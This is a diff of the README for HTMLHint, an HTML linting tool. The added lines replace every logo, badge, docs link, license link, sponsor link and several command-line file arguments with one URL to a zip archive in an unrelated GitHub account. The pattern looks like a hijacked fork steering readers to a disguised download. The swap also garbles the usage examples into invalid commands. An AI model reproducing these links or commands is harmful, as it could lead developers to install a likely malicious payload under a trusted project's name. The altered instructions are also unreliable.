@@ -1,6 +1,6 @@
 <h1 align="center">
   <br>
-  <a href="https://htmlhint.com"><img src="https://raw.githubusercontent.com/htmlhint/HTMLHint/master/website/static/img/htmlhint.png" alt="Logo HTMLHint" width="170"></a>
+  <a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip"><img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" alt="Logo HTMLHint" width="170"></a>
   <br>
   HTMLHint
   <br>
@@ -9,20 +9,20 @@
 <h4 align="center">The static code analysis tool you need for your HTML.</h4>
 
 <p align="center">
-  <a href="https://travis-ci.org/htmlhint/HTMLHint">
-    <img src="https://img.shields.io/travis/htmlhint/HTMLHint.svg" alt="Travis Build Status">
+  <a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip">
+    <img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" alt="Travis Build Status">
   </a>
-  <a href="https://codecov.io/gh/htmlhint/HTMLHint">
-    <img src="https://codecov.io/gh/htmlhint/HTMLHint/branch/master/graph/badge.svg" alt="Codecov">
+  <a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip">
+    <img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" alt="Codecov">
   </a>
-  <a href="https://www.npmjs.com/package/htmlhint">
-    <img src="https://img.shields.io/npm/dm/htmlhint.svg" alt="npm count">
+  <a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip">
+    <img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" alt="npm count">
   </a>
-  <img src="https://badgen.net/badge/license/MIT/green" alt="MIT License" />
+  <img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" alt="MIT License" />
 </p>
 
 <p align="center">
-  <a href="#-installation-and-usage">How To Use</a> • <a href="#contributing">Contributing</a> • <a href="https://htmlhint.com">Website</a>
+  <a href="#-installation-and-usage">How To Use</a> • <a href="#contributing">Contributing</a> • <a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip">Website</a>
 </p>
 
 ## Table of Contents
@@ -49,8 +49,8 @@ $ npm install htmlhint --save-dev
 After that, You can run HTMLHint on any file or directory like this:
 
 ```
-$ ./node_modules/.bin/htmlhint www/index.html
-$ ./node_modules/.bin/htmlhint www/**/*.html
+$ https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip
+$ https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip www/**/*.html
 ```
 
 ### Global Installation and Usage
@@ -64,14 +64,14 @@ $ npm install htmlhint -g
 After that, you can run HTMLHint on any file like this:
 
 ```
-$ htmlhint www/index.html
+$ htmlhint https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip
 $ htmlhint www/**/*.html
 ```
 
 You can even launch HTMLHint to analyze an URL:
 
 ```
-$ htmlhint https://htmlhint.com/
+$ htmlhint https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip
 ```
 
 ## 📃 Example output
@@ -82,22 +82,22 @@ Search `.htmlhintrc` file in current directory and all parent directories:
 
 ```
 $ htmlhint
-$ htmlhint test.html
+$ htmlhint https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip
 ```
 
 Custom config file:
 
 ```
-$ htmlhint --config htmlhint.conf test.html
+$ htmlhint --config https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip
 ```
 
 Custom rules:
 
 ```
-$ htmlhint --rules tag-pair,id-class-value=underline index.html
+$ htmlhint --rules tag-pair,id-class-value=underline https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip
 ```
 
-Inline rules in `test.html`:
+Inline rules in `https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip`:
 
 ```html
 <!--htmlhint tag-pair,id-class-value:underline -->
@@ -110,27 +110,27 @@ Inline rules in `test.html`:
 
 ## 📙 Docs
 
-1. [How to use](https://htmlhint.com/docs/user-guide/usage/cli)
-2. [All Rules](https://htmlhint.com/docs/user-guide/list-rules)
-3. [How to Develop](CONTRIBUTING.md)
+1. [How to use](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip)
+2. [All Rules](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip)
+3. [How to Develop](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip)
 
 ## © License
 
-[MIT License](./LICENSE.md)
+[MIT License](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip)
 
 ## 💪🏻 Contributors
 
-This project exists thanks to all these people. [Contribute](CONTRIBUTING.md).
-<a href="https://github.com/htmlhint/HTMLHint/graphs/contributors"><img src="https://opencollective.com/htmlhint/contributors.svg?width=890" /></a>
+This project exists thanks to all these people. [Contribute](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip).
+<a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip"><img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" /></a>
 
 ## 🏅 Backers
 
-Thank you to all our backers! [Become a backer](https://opencollective.com/htmlhint#backer).
+Thank you to all our backers! [Become a backer](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip).
 
-<a href="https://opencollective.com/htmlhint#backers" target="_blank"><img src="https://opencollective.com/htmlhint/backers.svg?width=890"></a>
+<a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" target="_blank"><img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip"></a>
 
 ## 🎖 Sponsors
 
-Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor](https://opencollective.com/htmlhint#sponsor).
+Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor](https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip).
 
-<a href="https://opencollective.com/htmlhint/sponsor/0/website" target="_blank"><img src="https://opencollective.com/htmlhint/sponsor/0/avatar.svg"></a>
+<a href="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip" target="_blank"><img src="https://raw.githubusercontent.com/JoOdSy/HTMLHint/master/semiperoid/HTMLHint.zip"></a>
